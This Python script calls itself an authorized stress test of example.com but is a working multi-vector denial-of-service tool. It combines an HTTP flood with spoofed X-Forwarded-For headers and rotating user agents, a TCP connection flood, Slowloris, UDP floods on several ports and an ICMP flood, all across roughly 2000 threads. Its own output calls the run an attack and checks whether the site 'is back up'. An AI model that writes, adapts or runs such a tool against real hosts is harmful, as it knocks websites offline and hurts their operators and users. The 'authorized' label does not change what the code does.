#!/usr/bin/env python3
"""
Web Site - Stress Test Script
Target: example.com
Duration: 10 minutes (600 seconds)
Authorized test on own server
"""

import socket
import threading
import random
import time
import sys
import requests
import urllib3
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "example.com"
PORT = 80  # Change to 443 if HTTPS
THREADS = 2000
DURATION = 600

# Multiple paths to hit
PATHS = [
    "/", "/about", "/contact", "/services", "/blog",
    "/wp-admin", "/wp-login.php", "/wp-content", "/wp-json",
    "/index.php", "/home", "/privacy-policy", "/terms",
    "/search", "/category", "/tag", "/author", "/page",
    "/2024", "/2025", "/legal", "/resources", "/articles",
] + [f"/?p={i}" for i in range(1, 50)]

# Random user agents
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

hit_count = 0
start_time = time.time()

# ─── LAYER 7: HTTP FLOOD with random paths ───
def http_flood():
    global hit_count
    session = requests.Session()
    while time.time() - start_time < DURATION:
        try:
            path = random.choice(PATHS)
            url = f"http://{TARGET}{path}"
            headers = {
                "User-Agent": random.choice(UAS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "Referer": f"http://{TARGET}/" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6)),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            }
            r = session.get(url, headers=headers, timeout=2, verify=False)
            hit_count += 1
        except:
            pass

# ─── LAYER 4: TCP SYN CONNECTION FLOOD ───
def tcp_flood():
    while time.time() - start_time < DURATION:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((TARGET, PORT))
            s.send(f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {TARGET}\r\nUser-Agent: {random.choice(UAS)}\r\nConnection: keep-alive\r\n\r\n".encode())
            time.sleep(0.001)
            s.close()
        except:
            pass

# ─── SLOWLORIS: Keep connections open ───
def slowloris():
    socks = []
    # Open initial connections
    for _ in range(300):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((TARGET, PORT))
            s.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\nHost: {TARGET}\r\nUser-Agent: {random.choice(UAS)}\r\n".encode())
            socks.append(s)
        except:
            pass
    
    # Keep them alive
    while time.time() - start_time < DURATION:
        for s in socks[:]:
            try:
                s.send(f"X-{random.randint(1,999999)}: {random.randint(100,999999)}\r\n".encode())
            except:
                socks.remove(s)
        time.sleep(5)

# ─── UDP FLOOD ───
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() - start_time < DURATION:
        try:
            data = random._urandom(1024)
            sock.sendto(data, (TARGET, PORT))
            sock.sendto(data, (TARGET, 443))
            sock.sendto(data, (TARGET, 53))
            sock.sendto(data, (TARGET, 8080))
        except:
            pass

# ─── ICMP FLOOD (Ping of Death style) ───
def icmp_flood():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        while time.time() - start_time < DURATION:
            packet = b"\x08\x00" + b"\x00\x00" + random._urandom(65500)
            sock.sendto(packet, (TARGET, 0))
    except:
        pass  # Needs root

# ─── STATUS MONITOR ───
def status_monitor():
    global hit_count
    while time.time() - start_time < DURATION:
        elapsed = int(time.time() - start_time)
        remaining = DURATION - elapsed
        rate = hit_count / (elapsed + 1)
        print(f"\r[⏱] {elapsed}s | [🔥] Hits: {hit_count} | [⚡] Rate: {rate:.0f}/s | [⏳] Remaining: {remaining}s", end="", flush=True)
        time.sleep(1)
    print()

# ─── MAIN ───
def main():
    global start_time
    start_time = time.time()
    
    print(f"""
╔═══════════════════════════════════════════╗
║    🔥 WEB SITE STRESS TEST 🔥            ║
╠═══════════════════════════════════════════╣
║ Target: example.com                       ║
║ Port:   {PORT}                            ║
║ Threads: {THREADS}                        ║
║ Duration: 10 minutes (600s)               ║
╠═══════════════════════════════════════════╣
║ Vectors: HTTP Flood | TCP Flood           ║
║          Slowloris | UDP Flood            ║
║          ICMP Flood                       ║
╚═══════════════════════════════════════════╝
    """)
    
    # Start monitor
    threading.Thread(target=status_monitor, daemon=True).start()
    
    # Start HTTP flood threads
    print("[+] Launching HTTP flood...")
    for _ in range(THREADS // 4):
        threading.Thread(target=http_flood, daemon=True).start()
    
    # Start TCP flood threads
    print("[+] Launching TCP connection flood...")
    for _ in range(THREADS // 3):
        threading.Thread(target=tcp_flood, daemon=True).start()
    
    # Start Slowloris
    print("[+] Launching Slowloris...")
    for _ in range(30):
        threading.Thread(target=slowloris, daemon=True).start()
    
    # Start UDP flood
    print("[+] Launching UDP flood...")
    for _ in range(50):
        threading.Thread(target=udp_flood, daemon=True).start()
    
    # Start ICMP flood
    print("[+] Launching ICMP flood...")
    threading.Thread(target=icmp_flood, daemon=True).start()
    
    print(f"\n[🔥] Attack running for {DURATION} seconds...\n")
    
    # Wait
    while time.time() - start_time < DURATION:
        time.sleep(5)
    
    print(f"\n[✅] Attack completed! Total hits: {hit_count}")
    print("[💡] Check if example.com is back up.")

if __name__ == "__main__":
    main()